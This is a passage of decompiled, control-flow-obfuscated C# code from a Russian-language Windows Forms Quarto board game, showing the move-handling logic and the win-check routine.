					if (Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0))
					{
						num3 = ((int)num4 * -285118964) ^ -702012771;
						continue;
					}
					goto IL_003f;
				case 3u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num3 = (int)((num4 * 915160354) ^ 0x8FFDB9E);
					continue;
				case 2u:
					num3 = ((int)num4 * -1690717114) ^ -2146594750;
					continue;
				case 1u:
					num5 = 0;
					num3 = ((int)num4 * -1766140290) ^ -2101396122;
					continue;
				case 0u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num3 = ((int)num4 * -272170773) ^ -480246813;
					continue;
				default:
					return;
				case 12u:
					break;
				case 20u:
					return;
					IL_003f:
					num3 = -1967421358;
					num11 = -1967421358;
					continue;
				}
				break;
			}
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		//IL_140e: Unknown result type (might be due to invalid IL or missing references)
		//IL_143c: Expected O, but got Unknown
		bool flag11 = default(bool);
		int num22 = default(int);
		bool flag3 = default(bool);
		int num3 = default(int);
		bool flag15 = default(bool);
		Graphics graphics_ = default(Graphics);
		int num7 = default(int);
		int num8 = default(int);
		Figurine[,] array3 = default(Figurine[,]);
		Figurine[,] array = default(Figurine[,]);
		int num5 = default(int);
		int num6 = default(int);
		int num24 = default(int);
		int num40 = default(int);
		bool flag14 = default(bool);
		bool flag5 = default(bool);
		bool flag20 = default(bool);
		bool flag7 = default(bool);
		int num48 = default(int);
		int num30 = default(int);
		int num15 = default(int);
		int num16 = default(int);
		int num4 = default(int);
		bool flag18 = default(bool);
		int num10 = default(int);
		int num39 = default(int);
		int num23 = default(int);
		bool flag = default(bool);
		bool flag6 = default(bool);
		int num14 = default(int);
		bool flag4 = default(bool);
		int num13 = default(int);
		bool flag17 = default(bool);
		Figurine[,] array2 = default(Figurine[,]);
		bool flag16 = default(bool);
		bool flag19 = default(bool);
		int num25 = default(int);
		bool flag13 = default(bool);
		bool flag9 = default(bool);
		int num21 = default(int);
		bool flag8 = default(bool);
		int num9 = default(int);
		bool flag12 = default(bool);
		bool flag10 = default(bool);
		bool flag2 = default(bool);
		while (true)
		{
			int num = -1677967064;
			while (true)
			{
				uint num2;
				int num47;
				int num31;
				int num46;
				int num41;
				switch ((num2 = (uint)num ^ 0xCC632760u) % 173u)
				{
				case 172u:
					flag11 = num22 < 4;
					num = -1833309665;
					continue;
				case 171u:
					flag3 = num3 < 4;
					num = -973008697;
					continue;
				case 170u:
				{
					int num64;
					int num65;
					if (!flag15)
					{
						num64 = -2106817612;
						num65 = -2106817612;
					}
					else
					{
						num64 = -720919504;
						num65 = -720919504;
					}
					num = num64 ^ (int)(num2 * 506980894);
					continue;
				}
				case 169u:
				{
					int num36;
					int num37;
					if (flag11)
					{
						num36 = 1086505211;
						num37 = 1086505211;
					}
					else
					{
						num36 = 570559326;
						num37 = 570559326;
					}
					num = num36 ^ (int)(num2 * 1963424420);
					continue;
				}
				case 168u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num7 + 0.05f) * (float)size, ((float)num8 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -329779936) ^ -283570552;
					continue;
				case 167u:
					array3 = (Figurine[,])Form1.smethod_48((Array)array);
					num = (int)((num2 * 274272791) ^ 0x3FCE0606);
					continue;
				case 166u:
					array = (Figurine[,])Form1.smethod_48((Array)board);
					num = ((int)num2 * -1990366673) ^ 0x5C01F49F;
					continue;
				case 165u:
					Form1.smethod_30((Control)(object)pictureBox[num5, num6]);
					num = ((int)num2 * -952745995) ^ 0x1213A582;
					continue;
				case 164u:
					storage[num5, num6] = null;
					Form1.smethod_5((Control)(object)borderBox[num24, num40], Color.Blue);
					Form1.smethod_30((Control)(object)borderBox[num24, num40]);
					num = ((int)num2 * -465869038) ^ 0x218482C;
					continue;
				case 163u:
				{
					int num53;
					int num54;
					if (!flag14)
					{
						num53 = -1451489258;
						num54 = -1451489258;
					}
					else
					{
						num53 = -1045629937;
						num54 = -1045629937;
					}
					num = num53 ^ ((int)num2 * -794880296);
					continue;
				}
				case 162u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = (int)((num2 * 1817621866) ^ 0x1BCD46AA);
					continue;
				case 161u:
					num = (int)((num2 * 456129951) ^ 0x2280F2C3);
					continue;
				case 160u:
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					num = ((int)num2 * -372563946) ^ -1317283039;
					continue;
				case 159u:
				{
					int num28;
					int num29;
					if (!flag5)
					{
						num28 = -776892642;
						num29 = -776892642;
					}
					else
					{
						num28 = -1028508563;
						num29 = -1028508563;
					}
					num = num28 ^ ((int)num2 * -553011031);
					continue;
				}
				case 158u:
					Form1.smethod_47(200);
					num = ((int)num2 * -433362759) ^ -501246962;
					continue;
				case 157u:
					num7 = Form1.smethod_33(rnd, 4);
					num = ((int)num2 * -2094026878) ^ -178266416;
					continue;
				case 156u:
					num = (int)((num2 * 1669336437) ^ 0x34E36C94);
					continue;
				case 155u:
				{
					int num68;
					int num69;
					if (flag20)
					{
						num68 = -1484108169;
						num69 = -1484108169;
					}
					else
					{
						num68 = -1895304288;
						num69 = -1895304288;
					}
					num = num68 ^ ((int)num2 * -999265083);
					continue;
				}
				case 154u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -298787745) ^ 0x73419AD8;
					continue;
				case 153u:
					flag20 = Standoff(board);
					num = (int)((num2 * 2016795814) ^ 0x5EA5340D);
					continue;
				case 152u:
					flag7 = false;
					num = (int)(num2 * 849004188) ^ -1488664733;
					continue;
				case 151u:
					board[num48, num30] = new Figurine(storage[num15, num16]);
					num = ((int)num2 * -1939305367) ^ 0x207E2BEB;
					continue;
				case 150u:
				{
					int num61;
					if (!Standoff(board))
					{
						num = -2002820195;
						num61 = -2002820195;
					}
					else
					{
						num = -2101154589;
						num61 = -2101154589;
					}
					continue;
				}
				case 149u:
					board[num8, num7] = new Figurine(storage[num5, num6]);
					num = ((int)num2 * -2073658738) ^ -1744241008;
					continue;
				case 148u:
					num15 = num3;
					num16 = num4;
					num = ((int)num2 * -408092321) ^ 0x348C06AD;
					continue;
				case 147u:
					flag18 = num10 < 4;
					num = -1220436202;
					continue;
				case 146u:
					num39++;
					num = -475587051;
					continue;
				case 145u:
					num = ((int)num2 * -875924398) ^ 0x6506D15E;
					continue;
				case 144u:
					num = ((int)num2 * -1447749259) ^ 0x236BFE0D;
					continue;
				case 143u:
					num23++;
					num = -1595624913;
					continue;
				case 142u:
					num22 = 0;
					num = -904896792;
					continue;
				case 141u:
					num = (int)((num2 * 294546233) ^ 0x6277012A);
					continue;
				case 140u:
				{
					int num51;
					int num52;
					if (flag)
					{
						num51 = -473515356;
						num52 = -473515356;
					}
					else
					{
						num51 = -1462133497;
						num52 = -1462133497;
					}
					num = num51 ^ ((int)num2 * -2017176285);
					continue;
				}
				case 139u:
					num47 = ((num39 < 9) ? 1 : 0);
					goto IL_0473;
				case 138u:
					num = ((int)num2 * -1559905035) ^ 0x282314FC;
					continue;
				case 137u:
					num = (int)(num2 * 1300262475) ^ -1258889254;
					continue;
				case 136u:
					Form1.smethod_30((Control)(object)borderBox[num5, num6]);
					num = ((int)num2 * -429213769) ^ -2108363514;
					continue;
				case 135u:
				{
					int num42;
					int num43;
					if (!flag6)
					{
						num42 = 537603284;
						num43 = 537603284;
					}
					else
					{
						num42 = 1152215933;
						num43 = 1152215933;
					}
					num = num42 ^ ((int)num2 * -1361207751);
					continue;
				}
				case 134u:
					num = ((int)num2 * -979696981) ^ -432391092;
					continue;
				case 133u:
				{
					int num38;
					if (num14 < 4)
					{
						num = -422011439;
						num38 = -422011439;
					}
					else
					{
						num = -1265147016;
						num38 = -1265147016;
					}
					continue;
				}
				case 132u:
					num14 = 0;
					num = -1219828972;
					continue;
				case 131u:
					num = ((int)num2 * -592798629) ^ -73835788;
					continue;
				case 130u:
					Form1.smethod_32((Control)(object)richTextBox1, "Подождите, компьютер делает свой ход.");
					num = (int)(num2 * 694461138) ^ -62852718;
					continue;
				case 129u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -1854197415) ^ 0x5794EB8F;
					continue;
				case 128u:
				{
					int num19;
					int num20;
					if (flag4)
					{
						num19 = 1967641690;
						num20 = 1967641690;
					}
					else
					{
						num19 = 1878429845;
						num20 = 1878429845;
					}
					num = num19 ^ ((int)num2 * -998073859);
					continue;
				}
				case 127u:
					num = ((int)num2 * -1413666957) ^ 0x42E12EA5;
					continue;
				case 126u:
					num = (int)((num2 * 2125973306) ^ 0x4A584B62);
					continue;
				case 125u:
					Form1.smethod_32((Control)(object)richTextBox1, "Выберете фигуру, которой будет играть противник.");
					num = ((int)num2 * -2075795253) ^ -1141189269;
					continue;
				case 124u:
					num13++;
					num = ((int)num2 * -1232666835) ^ 0x5C3DA4E7;
					continue;
				case 123u:
					step++;
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = -199167531;
					continue;
				case 122u:
				{
					int num70;
					int num71;
					if (flag17)
					{
						num70 = 2076738017;
						num71 = 2076738017;
					}
					else
					{
						num70 = 673966382;
						num71 = 673966382;
					}
					num = num70 ^ (int)(num2 * 1974272120);
					continue;
				}
				case 121u:
					num = (int)(num2 * 211445083) ^ -1039254076;
					continue;
				case 120u:
					Form1.smethod_30((Control)(object)pictureBox[num3, num4]);
					num = ((int)num2 * -965180216) ^ 0x4DE9A8D3;
					continue;
				case 119u:
					num = (int)((num2 * 225169742) ^ 0x10FD8286);
					continue;
				case 118u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник сделал ход (зелёный). Выберете поле на доске для выбронной противником фигуры (синий).");
					num = (int)((num2 * 1114957444) ^ 0xAF51E72);
					continue;
				case 117u:
					num30 = num4;
					num = ((int)num2 * -1716282645) ^ 0x554CFAFC;
					continue;
				case 116u:
					num10++;
					num = ((int)num2 * -1276332218) ^ -717173182;
					continue;
				case 115u:
					(menu as Form3).ContinueLock();
					num = (int)((num2 * 830868382) ^ 0x12E37176);
					continue;
				case 114u:
					num = -976619548;
					continue;
				case 113u:
					num = ((int)num2 * -45349386) ^ -952232407;
					continue;
				case 112u:
					num = ((int)num2 * -1919255757) ^ -20579963;
					continue;
				case 111u:
					if (!Stop(array2))
					{
						num = (int)(num2 * 127364656) ^ -921761567;
						continue;
					}
					num31 = 1;
					goto IL_0789;
				case 110u:
					num = (int)(num2 * 1499453340) ^ -225525235;
					continue;
				case 109u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = (int)((num2 * 937295649) ^ 0x4BBEE989);
					continue;
				case 108u:
				{
					array3[num13, num23] = new Figurine(storage[num24, num40]);
					int num66;
					int num67;
					if (Stop(array3))
					{
						num66 = -835073488;
						num67 = -835073488;
					}
					else
					{
						num66 = -672961456;
						num67 = -672961456;
					}
					num = num66 ^ (int)(num2 * 1877855948);
					continue;
				}
				case 107u:
				{
					int num62;
					int num63;
					if (!flag16)
					{
						num62 = -1471990357;
						num63 = -1471990357;
					}
					else
					{
						num62 = -606055262;
						num63 = -606055262;
					}
					num = num62 ^ ((int)num2 * -1299828135);
					continue;
				}
				case 106u:
				{
					int num59;
					int num60;
					if (!flag19)
					{
						num59 = -1670840540;
						num60 = -1670840540;
					}
					else
					{
						num59 = -746179644;
						num60 = -746179644;
					}
					num = num59 ^ (int)(num2 * 1968281958);
					continue;
				}
				case 105u:
					num = (int)((num2 * 695293618) ^ 0x614ED895);
					continue;
				case 104u:
					flag4 = num25 < 4;
					num = -1195705972;
					continue;
				case 103u:
					Form1.smethod_7((Control)(object)pictureBox[num25, num14], bool_0: false);
					num = (int)(num2 * 590917207) ^ -181690510;
					continue;
				case 102u:
					Form1.smethod_5((Control)(object)borderBox[num3, num4], Color.White);
					num = (int)((num2 * 1213270925) ^ 0x29C120A5);
					continue;
				case 101u:
				{
					int num58;
					if (Form1.smethod_41((Control)(object)borderBox[num3, num4]) == Color.Blue)
					{
						num = -1560968699;
						num58 = -1560968699;
					}
					else
					{
						num = -1047055057;
						num58 = -1047055057;
					}
					continue;
				}
				case 100u:
					num = -50802302;
					continue;
				case 98u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = (int)((num2 * 502091013) ^ 0x5CD8A5B4);
					continue;
				case 97u:
					num = (int)((num2 * 1121552083) ^ 0x38538BDC);
					continue;
				case 96u:
					Form1.smethod_30((Control)(object)richTextBox1);
					num = (int)(num2 * 1123379788) ^ -2083508295;
					continue;
				case 95u:
					num = ((int)num2 * -1216573591) ^ 0xDFCE455;
					continue;
				case 94u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num15 = 0;
					num16 = 0;
					num48 = 0;
					num = (int)(num2 * 871977774) ^ -1300303929;
					continue;
				case 93u:
					num = ((int)num2 * -2061262278) ^ -938217401;
					continue;
				case 92u:
					num = (int)(num2 * 1165181957) ^ -1370693385;
					continue;
				case 91u:
					if (!Stop(board))
					{
						num = (int)((num2 * 123724888) ^ 0x214F8D10);
						continue;
					}
					num46 = 0;
					goto IL_09f9;
				case 90u:
					num = (int)(num2 * 1008956327) ^ -776352246;
					continue;
				case 89u:
					Form1.smethod_5((Control)(object)borderBox[num25, num14], Color.LimeGreen);
					num = ((int)num2 * -747711733) ^ -2007901236;
					continue;
				case 88u:
				{
					int num56;
					int num57;
					if (flag18)
					{
						num56 = -470589058;
						num57 = -470589058;
					}
					else
					{
						num56 = -620483731;
						num57 = -620483731;
					}
					num = num56 ^ ((int)num2 * -1631464939);
					continue;
				}
				case 87u:
					num = ((int)num2 * -432383301) ^ 0x124FCE38;
					continue;
				case 86u:
					flag17 = Form1.smethod_41((Control)(object)borderBox[num25, num14]) == Color.Red;
					num = (int)((num2 * 1320560400) ^ 0x2587950);
					continue;
				case 85u:
					num = ((int)num2 * -793722811) ^ 0x359275E2;
					continue;
				case 84u:
				{
					int num55;
					if (num23 < 4)
					{
						num = -1916261815;
						num55 = -1916261815;
					}
					else
					{
						num = -635053816;
						num55 = -635053816;
					}
					continue;
				}
				case 83u:
					Form1.smethod_20(pictureBox[num3, num4], (Image)null);
					num = (int)((num2 * 1577261070) ^ 0x44B91235);
					continue;
				case 82u:
					array[num8, num7] = new Figurine(storage[num5, num6]);
					num13 = 0;
					num = ((int)num2 * -1366114275) ^ -6088358;
					continue;
				case 81u:
					if (num24 == num5)
					{
						num = (int)((num2 * 1955129932) ^ 0x1129A9E4);
						continue;
					}
					num41 = 0;
					goto IL_0b60;
				case 80u:
					num = ((int)num2 * -309837475) ^ -35797776;
					continue;
				case 79u:
					num41 = ((num40 == num6) ? 1 : 0);
					goto IL_0b60;
				case 78u:
				{
					int num49;
					int num50;
					if (!flag13)
					{
						num49 = -1366498117;
						num50 = -1366498117;
					}
					else
					{
						num49 = -1659305256;
						num50 = -1659305256;
					}
					num = num49 ^ ((int)num2 * -2014023194);
					continue;
				}
				case 77u:
					num4 = 0;
					num = -1749114251;
					continue;
				case 76u:
					flag9 = board[num8, num7] != null;
					num = (int)(num2 * 488669673) ^ -583619913;
					continue;
				case 75u:
					num = (int)(num2 * 680217186) ^ -175199253;
					continue;
				case 74u:
					num = (int)(num2 * 1885591825) ^ -671259907;
					continue;
				case 73u:
					num4++;
					num = (int)(num2 * 422521866) ^ -1406803159;
					continue;
				case 72u:
					num10 = 0;
					num = ((int)num2 * -1202915847) ^ 0x13FED627;
					continue;
				case 71u:
					(menu as Form3).ContinueLock();
					num = ((int)num2 * -1707971062) ^ 0x765DAF3;
					continue;
				case 70u:
					num5 = 0;
					num6 = 0;
					num25 = 0;
					num = ((int)num2 * -1724085597) ^ -1454339274;
					continue;
				case 69u:
					num48 = num3;
					num = (int)(num2 * 529302813) ^ -1772543421;
					continue;
				case 68u:
					if (!flag7)
					{
						num = ((int)num2 * -175121069) ^ -1863959982;
						continue;
					}
					num47 = 1;
					goto IL_0473;
				case 67u:
					num21++;
					num = (int)(num2 * 1778300200) ^ -600598751;
					continue;
				case 66u:
					num = ((int)num2 * -1485559423) ^ -208711084;
					continue;
				case 65u:
					Form1.smethod_5((Control)(object)borderBox[num5, num6], Color.White);
					num = ((int)num2 * -871162465) ^ -1036714972;
					continue;
				case 64u:
					num40 = Form1.smethod_33(rnd, 4);
					num = (int)((num2 * 974817229) ^ 0x6491880B);
					continue;
				case 63u:
					num8 = Form1.smethod_33(rnd, 4);
					num = -488210101;
					continue;
				case 62u:
					flag8 = board[num10, num9] == null;
					num = -1331795626;
					continue;
				case 61u:
					num = -1141603367;
					continue;
				case 60u:
					Form1.smethod_30((Control)(object)borderBox[num25, num14]);
					num = ((int)num2 * -2136085251) ^ 0x296F5A89;
					continue;
				case 59u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num5, num6]), num9 * size + 4, num10 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = ((int)num2 * -504073396) ^ -824074598;
					continue;
				case 58u:
					Form1.smethod_47(200);
					num = (int)((num2 * 1707778772) ^ 0x4EC1E0C7);
					continue;
				case 57u:
					num46 = ((!Standoff(board)) ? 1 : 0);
					goto IL_09f9;
				case 56u:
					flag15 = num21 < 4;
					num = -1409862676;
					continue;
				case 55u:
				{
					int num44;
					int num45;
					if (flag12)
					{
						num44 = 1913758565;
						num45 = 1913758565;
					}
					else
					{
						num44 = 1685993262;
						num45 = 1685993262;
					}
					num = num44 ^ ((int)num2 * -2062408254);
					continue;
				}
				case 54u:
					Form1.smethod_5((Control)(object)borderBox[num5, num6], Color.White);
					Form1.smethod_30((Control)(object)borderBox[num5, num6]);
					Form1.smethod_20(pictureBox[num5, num6], (Image)null);
					num = ((int)num2 * -1381954535) ^ 0x4DCF7;
					continue;
				case 53u:
					array2 = (Figurine[,])Form1.smethod_48((Array)board);
					array2[num10, num9] = new Figurine(storage[num5, num6]);
					num = (int)((num2 * 1347154918) ^ 0x3AC04EA6);
					continue;
				case 52u:
					num25++;
					num = (int)((num2 * 1240865336) ^ 0x212A9490);
					continue;
				case 51u:
					num21 = 0;
					num = (int)((num2 * 1368289443) ^ 0x38D72B35);
					continue;
				case 50u:
					if (storage[num24, num40] != null)
					{
						num = (int)((num2 * 1498866427) ^ 0x3199A9D8);
						continue;
					}
					num41 = 1;
					goto IL_0b60;
				case 49u:
					step++;
					num = (int)(num2 * 1643580209) ^ -458681655;
					continue;
				case 48u:
					num = ((int)num2 * -2076354023) ^ -822636519;
					continue;
				case 47u:
					flag14 = num9 < 4;
					num = -2101333739;
					continue;
				case 46u:
					num = -719151350;
					continue;
				case 45u:
					num = ((int)num2 * -36353535) ^ 0x5C7B8891;
					continue;
				case 44u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = (int)(num2 * 970815428) ^ -1783165138;
					continue;
				case 43u:
					num39 = 0;
					num = ((int)num2 * -1901359889) ^ -1847695058;
					continue;
				case 42u:
					num9 = 0;
					num = -1379297741;
					continue;
				case 40u:
					flag13 = num13 < 4;
					num = -1914352862;
					continue;
				case 39u:
					flag12 = num4 < 4;
					num = -1850490117;
					continue;
				case 38u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					Form1.smethod_15(timer1);
					num = (int)((num2 * 2110396380) ^ 0x4128E7E2);
					continue;
				case 37u:
				{
					int num34;
					int num35;
					if (flag10)
					{
						num34 = 1998414533;
						num35 = 1998414533;
					}
					else
					{
						num34 = 1041259756;
						num35 = 1041259756;
					}
					num = num34 ^ ((int)num2 * -1098028656);
					continue;
				}
				case 36u:
				{
					int num32;
					int num33;
					if (flag9)
					{
						num32 = 1346596679;
						num33 = 1346596679;
					}
					else
					{
						num32 = 129113037;
						num33 = 129113037;
					}
					num = num32 ^ (int)(num2 * 1402603880);
					continue;
				}
				case 35u:
					num31 = (Standoff(array2) ? 1 : 0);
					goto IL_0789;
				case 34u:
					board[num10, num9] = new Figurine(storage[num5, num6]);
					storage[num5, num6] = null;
					num = ((int)num2 * -1327823069) ^ 0x474345A5;
					continue;
				case 33u:
					num30 = 0;
					num3 = 0;
					num = (int)((num2 * 1330458195) ^ 0x2583A6FE);
					continue;
				case 32u:
					num3++;
					num = (int)(num2 * 1269006384) ^ -1759167177;
					continue;
				case 31u:
					Form1.smethod_15(timer1);
					num = -82689379;
					continue;
				case 30u:
					num23 = 0;
					num = -1941206885;
					continue;
				case 29u:
				{
					int num26;
					int num27;
					if (!flag8)
					{
						num26 = -1815443970;
						num27 = -1815443970;
					}
					else
					{
						num26 = -2956370;
						num27 = -2956370;
					}
					num = num26 ^ ((int)num2 * -1665594923);
					continue;
				}
				case 28u:
					num5 = num25;
					num6 = num14;
					num = (int)(num2 * 1586641546) ^ -2017040234;
					continue;
				case 27u:
					Form1.smethod_32((Control)(object)richTextBox1, "QUARTO! Компьютер выиграл!");
					num = -196968488;
					continue;
				case 26u:
					flag7 = true;
					num = (int)(num2 * 263711873) ^ -1377637632;
					continue;
				case 25u:
					num24 = Form1.smethod_33(rnd, 4);
					num = -1646575813;
					continue;
				case 24u:
					Form1.smethod_30((Control)(object)pictureBox[num5, num6]);
					num = (int)((num2 * 443820469) ^ 0x2F28F9FA);
					continue;
				case 23u:
					num = (int)(num2 * 1322219007) ^ -815049686;
					continue;
				case 22u:
					num = (int)(num2 * 1367662846) ^ -525713485;
					continue;
				case 21u:
					Form1.smethod_30((Control)(object)label2);
					num = (int)((num2 * 616169819) ^ 0x59634D7D);
					continue;
				case 20u:
					num22++;
					num = ((int)num2 * -1532715167) ^ -791513267;
					continue;
				case 19u:
					num9++;
					num = -1379297741;
					continue;
				case 18u:
					num = -1068663536;
					continue;
				case 17u:
					flag6 = array[num13, num23] == null;
					num = -2095419371;
					continue;
				case 16u:
					num = -1050938143;
					continue;
				case 15u:
					flag5 = Form1.smethod_46((Control)(object)pictureBox1);
					num = ((int)num2 * -1080431587) ^ 0x125E346A;
					continue;
				case 14u:
					num = ((int)num2 * -942249984) ^ 0x1215B116;
					continue;
				case 13u:
					Form1.smethod_7((Control)(object)pictureBox[num21, num22], bool_0: true);
					num = -415947867;
					continue;
				case 12u:
					Form1.smethod_47(1000);
					num = ((int)num2 * -2053546657) ^ -477057754;
					continue;
				case 11u:
				{
					int num17;
					int num18;
					if (flag3)
					{
						num17 = -739044926;
						num18 = -739044926;
					}
					else
					{
						num17 = -274571434;
						num18 = -274571434;
					}
					num = num17 ^ (int)(num2 * 2096847294);
					continue;
				}
				case 10u:
					storage[num15, num16] = null;
					Paint_Board();
					num = ((int)num2 * -14399536) ^ -1272512796;
					continue;
				case 9u:
					num = (int)(num2 * 393801317) ^ -1159695890;
					continue;
				case 8u:
					num14++;
					num = -94485983;
					continue;
				case 7u:
					num = ((int)num2 * -459675628) ^ -1340847848;
					continue;
				case 6u:
				{
					int num11;
					int num12;
					if (!flag2)
					{
						num11 = -560112195;
						num12 = -560112195;
					}
					else
					{
						num11 = -1664545815;
						num12 = -1664545815;
					}
					num = num11 ^ ((int)num2 * -1772140552);
					continue;
				}
				case 5u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num9 + 0.05f) * (float)size, ((float)num10 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -1000664916) ^ 0x5BB5A673;
					continue;
				case 4u:
					flag = Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), num4 * size + size / 2, (int)(((float)num3 + 0.05f) * (float)size)) == Color.FromArgb(255, 255, 0, 0);
					num = -770324027;
					continue;
				case 3u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num5, num6]), num7 * size + 4, num8 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = (int)(num2 * 1621296685) ^ -564850140;
					continue;
				case 2u:
					Form1.smethod_20(pictureBox[num5, num6], (Image)null);
					num = ((int)num2 * -1748487951) ^ 0x4BA35AE3;
					continue;
				case 1u:
					Form1.smethod_30((Control)(object)borderBox[num3, num4]);
					num = (int)((num2 * 1693579544) ^ 0x7F2545B5);
					continue;
				case 0u:
					num = (int)(num2 * 1992310638) ^ -132859911;
					continue;
				default:
					return;
				case 99u:
					break;
				case 41u:
					return;
					IL_0473:
					flag16 = (byte)num47 != 0;
					num = -1616336151;
					continue;
					IL_0b60:
					flag10 = (byte)num41 != 0;
					num = -1249941098;
					continue;
					IL_09f9:
					flag2 = (byte)num46 != 0;
					num = -1489063517;
					continue;
					IL_0789:
					flag19 = (byte)num31 != 0;
					num = -649892840;
					continue;
				}
				break;
			}
		}
	}

	private bool Stop(Figurine[,] mem)
	{
		int num3 = default(int);
		bool flag3 = default(bool);
		bool flag = default(bool);
		bool result = default(bool);
		bool flag2 = default(bool);
		while (true)
		{
			int num = 1540111000;
			while (true)
			{
				uint num2;
				int num10;
				int num15;
				switch ((num2 = (uint)num ^ 0x85DB8BDu) % 78u)
				{
				case 77u:
					if (mem[0, num3] != null)
					{
						num = 912872475;
						continue;
					}
					goto IL_001a;
				case 76u:
				{
					int num69;
					int num70;
					if (mem[num3, 1].Dark == mem[num3, 2].Dark)
					{
						num69 = -1933191783;
						num70 = -1933191783;
					}
					else
					{
						num69 = -1394866660;
						num70 = -1394866660;
					}
					num = num69 ^ ((int)num2 * -491293146);
					continue;
				}
				case 75u:
					if (mem[2, num3] != null)
					{
						num = ((int)num2 * -2127998599) ^ 0x17572127;
						continue;
					}
					goto IL_001a;
				case 74u:
				{
					int num37;
					if (mem[0, num3].Dark == mem[1, num3].Dark)
					{
						num = 1858759906;
						num37 = 1858759906;
					}
					else
					{
						num = 1454839011;
						num37 = 1454839011;
					}
					continue;
				}
				case 73u:
				{
					int num50;
					int num51;
					if (mem[1, 1] != null)
					{
						num50 = 1828111912;
						num51 = 1828111912;
					}
					else
					{
						num50 = 1574288961;
						num51 = 1574288961;
					}
					num = num50 ^ (int)(num2 * 1854097978);
					continue;
				}
				case 72u:
				{
					int num45;
					if (mem[0, num3].Point == mem[1, num3].Point)
					{
						num = 590010558;
						num45 = 590010558;
					}
					else
					{
						num = 631737800;
						num45 = 631737800;
					}
					continue;
				}
				case 71u:
				{
					int num25;
					if (mem[num3, 0].Square == mem[num3, 1].Square)
					{
						num = 508832758;
						num25 = 508832758;
					}
					else
					{
						num = 209117010;
						num25 = 209117010;
					}
					continue;
				}
				case 70u:
					if (mem[3, 0] != null)
					{
						num = ((int)num2 * -1312182601) ^ -1699516141;
						continue;
					}
					goto IL_017b;
				case 69u:
				{
					int num55;
					int num56;
					if (mem[1, 2].Point != mem[2, 1].Point)
					{
						num55 = 1152594573;
						num56 = 1152594573;
					}
					else
					{
						num55 = 666897754;
						num56 = 666897754;
					}
					num = num55 ^ ((int)num2 * -802475175);
					continue;
				}
				case 68u:
				{
					int num34;
					if (mem[0, 3].Point == mem[1, 2].Point)
					{
						num = 1138924620;
						num34 = 1138924620;
					}
					else
					{
						num = 721020996;
						num34 = 721020996;
					}
					continue;
				}
				case 67u:
					if (mem[3, num3] != null)
					{
						num = ((int)num2 * -664954171) ^ -94224407;
						continue;
					}
					goto IL_001a;
				case 66u:
					if (mem[num3, 2].Dark != mem[num3, 3].Dark)
					{
						num = (int)((num2 * 506808572) ^ 0x3DF1B200);
						continue;
					}
					goto IL_025f;
				case 65u:
					if (mem[0, 3].Square == mem[1, 2].Square)
					{
						num = 1359156215;
						continue;
					}
					goto IL_017b;
				case 64u:
					if (mem[1, 2] != null)
					{
						num = ((int)num2 * -1704167997) ^ -1969800894;
						continue;
					}
					goto IL_017b;
				case 63u:
					if (mem[0, num3].Square == mem[1, num3].Square)
					{
						num = 1861463285;
						continue;
					}
					goto IL_02d7;
				case 62u:
					num = ((int)num2 * -1050010517) ^ -750237966;
					continue;
				case 61u:
				{
					int num61;
					int num62;
					if (mem[num3, 2] != null)
					{
						num61 = -354619979;
						num62 = -354619979;
					}
					else
					{
						num61 = -388089522;
						num62 = -388089522;
					}
					num = num61 ^ ((int)num2 * -375970564);
					continue;
				}
				case 60u:
					num3 = 0;
					num = ((int)num2 * -1584728989) ^ 0x3F7CB78D;
					continue;
				case 59u:
				{
					int num52;
					if (mem[num3, 0].Dark == mem[num3, 1].Dark)
					{
						num = 644061655;
						num52 = 644061655;
					}
					else
					{
						num = 1538906016;
						num52 = 1538906016;
					}
					continue;
				}
				case 58u:
				{
					int num44;
					if (mem[0, 0].Dark != mem[1, 1].Dark)
					{
						num = 90170931;
						num44 = 90170931;
					}
					else
					{
						num = 1300812193;
						num44 = 1300812193;
					}
					continue;
				}
				case 57u:
				{
					int num35;
					int num36;
					if (mem[0, 0] != null)
					{
						num35 = 1205709176;
						num36 = 1205709176;
					}
					else
					{
						num35 = 1095419887;
						num36 = 1095419887;
					}
					num = num35 ^ ((int)num2 * -2078905724);
					continue;
				}
				case 56u:
					num = 1810815696;
					continue;
				case 55u:
					if (mem[2, 1] != null)
					{
						num = (int)((num2 * 1029886199) ^ 0x74C5AE84);
						continue;
					}
					goto IL_017b;
				case 54u:
				{
					int num18;
					int num19;
					if (mem[num3, 1] == null)
					{
						num18 = -1368127514;
						num19 = -1368127514;
					}
					else
					{
						num18 = -293530192;
						num19 = -293530192;
					}
					num = num18 ^ (int)(num2 * 1597513466);
					continue;
				}
				case 53u:
				{
					int num13;
					if (mem[num3, 0] != null)
					{
						num = 707491935;
						num13 = 707491935;
					}
					else
					{
						num = 209117010;
						num13 = 209117010;
					}
					continue;
				}
				case 52u:
					if (mem[2, num3].Dark != mem[3, num3].Dark)
					{
						num = ((int)num2 * -800313229) ^ 0x3F5857D;
						continue;
					}
